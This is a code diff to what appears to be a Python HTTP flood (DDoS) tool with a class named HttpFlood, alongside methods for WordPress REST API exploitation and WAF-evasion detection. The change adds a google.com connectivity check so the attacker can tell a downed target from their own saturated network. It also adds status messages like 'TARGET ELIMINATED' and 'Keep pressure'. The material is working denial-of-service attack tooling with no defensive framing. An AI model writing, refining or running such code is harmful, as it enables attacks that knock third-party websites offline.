@@ -1886,7 +1886,19 @@ class HttpFlood(Thread):
                 intel["target_getting_weaker"] = True
         except:
             # Timeout = target might be down
-            intel["target_getting_weaker"] = True
+            # [V40] Prevent False-Positives caused by Self-DDoS (Local Wi-Fi NAT Exhaustion)
+            try:
+                urllib.request.urlopen("https://www.google.com", timeout=3)
+                # Google responded, meaning our internet is fine, thus the target IS actually DOWN.
+                intel["target_getting_weaker"] = True
+                intel["target_is_down"] = True
+                intel["local_network_choked"] = False
+            except:
+                # Google also timed out! Our local network is completely congested/exhausted!
+                intel["local_network_choked"] = True
+                intel["target_is_down"] = False
+                if int(REQUESTS_SENT) % 1000 == 0:
+                    print(f"{bcolors.FAIL}[WARNING] Local Wi-Fi Limit Reached (NAT Exhausted). Throttle down Threads!{bcolors.RESET}")
 
     def _chaos_wp_json_exploitation(self):
         """[V32+] WordPress REST API Endpoint Discovery and Exploitation.
@@ -5884,8 +5896,15 @@ class HttpFlood(Thread):
             if len(intel["health_history"]) >= 3:
                 last_3 = intel["health_history"][-3:]
                 if all(t >= 9999 for t in last_3):
-                    intel["target_is_down"] = True
-                    intel["target_getting_weaker"] = True
+                    try:
+                        import urllib.request
+                        urllib.request.urlopen("https://www.google.com", timeout=3)
+                        intel["target_is_down"] = True
+                        intel["target_getting_weaker"] = True
+                        intel["local_network_choked"] = False
+                    except:
+                        intel["target_is_down"] = False
+                        intel["local_network_choked"] = True
     
     def _chaos_detect_waf_adaptation(self):
         """Detect if the WAF is learning our attack patterns and adapting."""
@@ -7217,7 +7236,9 @@ class HttpFlood(Thread):
                 elapsed = int(time() - intel["attack_start_time"])
                 
                 # Target health indicator
-                if intel.get("target_is_down"):
+                if intel.get("local_network_choked"):
+                    health_indicator = f"{bcolors.FAIL}LOCAL WIFI/NAT DEAD - SELF-DDOS (Decrease Threads!){bcolors.RESET}"
+                elif intel.get("target_is_down"):
                     health_indicator = f"{bcolors.OKGREEN}DOWN - TARGET ELIMINATED{bcolors.RESET}"
                 elif intel.get("target_getting_weaker"):
                     health_indicator = f"{bcolors.WARNING}WEAKENING - Keep pressure{bcolors.RESET}"
